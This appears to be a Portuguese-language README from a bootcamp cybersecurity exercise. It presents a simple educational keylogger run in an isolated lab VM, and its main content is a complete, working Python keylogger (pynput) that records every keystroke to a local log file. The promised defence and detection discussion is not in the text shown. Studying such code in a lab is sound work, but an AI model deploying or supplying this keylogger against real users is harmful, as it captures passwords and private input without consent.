# dio-bootcamp-santander-keylogger
Simulando um malware de captura de dados simples em python e aprendendo a se proteger.

# Simulação Educacional de Keylogger e Estratégias de Defesa em Python

Repositório desenvolvido para o desafio prático de cibersegurança do bootcamp Santander, com foco educacional, análise técnica e defesa, executado exclusivamente em ambiente virtualizado isolado (VM de laboratório).

## 🎯 Objetivos do Desafio
- Compreender na prática como um **Keylogger** em Python intercepta eventos de teclado e grava entradas em arquivo texto.
- Analisar o comportamento de cada bloco e comando do script sob a ótica de segurança ofensiva/defensiva.
- Documentar limitações da implementação e medidas de prevenção, detecção e resposta a incidentes.

## 🧪 Ambiente de Testes
- **Ambiente:** Máquina virtual isolada para laboratório educacional (sem dados reais ou rede de produção).
- **Linguagem e Dependências:** Python 3.x e biblioteca `pynput`.
- **Finalidade:** Estudo prático de segurança da informação e portfólio técnico.

---

## 💻 Código do Keylogger (`keylogger_simulado.py`)

```python
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,
}

def on_press(key):
    try:
        # se for uma tecla "normal" (letra, número, símbolo)

        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
